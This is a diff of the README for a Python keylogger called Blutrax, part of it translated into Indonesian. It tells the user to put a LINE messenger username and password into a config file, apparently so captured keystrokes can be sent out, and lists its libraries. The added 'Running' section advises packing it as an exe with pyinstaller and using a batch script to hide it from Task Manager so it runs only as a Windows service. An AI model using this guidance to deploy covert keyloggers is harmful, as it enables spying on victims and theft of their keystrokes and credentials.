@@ -2,9 +2,12 @@
 Python Blutrax Keylogger 
 
 ## Configuration
-open file `blutrax/conf.py` and add your `line username` and `line password`.
+buka file `blutrax/conf.py` dan tambahkan `line username` dan `line password` kalian.
 
 ## Need ?
 * Python 2.7
 * pyautogui
 * pyhook
+
+## Running
+saya merekomendasikan untuk membuat `exe` dengan `pyinstaller`. setelah itu sedikit sentuhan dengan `batch` yang digunakan untuk menghilangkan `program blutrax` dari `task manager` dan hanya berjalan si `Service` windows.
